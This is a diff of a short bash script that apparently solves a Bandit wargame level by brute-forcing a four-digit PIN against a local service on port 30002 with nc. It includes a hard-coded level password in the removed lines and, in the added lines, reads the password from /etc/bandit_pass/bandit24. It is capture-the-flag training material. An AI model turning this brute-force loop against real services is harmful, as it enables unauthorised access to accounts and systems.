@@ -1,9 +1,13 @@
 combo=$(echo {0..9}{0..9}{0..9}{0..9})
-combo_arr=($combo)
-for i in $(seq $1 9999); do
-	passw=$(echo 'UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ ' ${combo_arr[$i]})
-	echo 'attempting ' $passw 
-	echo $passw >> outp.txt
-	attempt=$(nc -q 2 localhost 30002 <<< $passw)
-	echo $attempt >> outp.txt
+combos=($combo)
+passw=$(cat /etc/bandit_pass/bandit24)
+timeouti=2
+for i in $(seq $1 $2); do
+	attempt=$(echo -e $passw ${combos[$i]})
+	result=$(echo $attempt | nc -q $timeouti localhost 30002)
+	echo -e $attempt
+	cleared=$(python clear.py $result)
+	echo $cleared
+	echo $cleared > outp.txt
 done
+
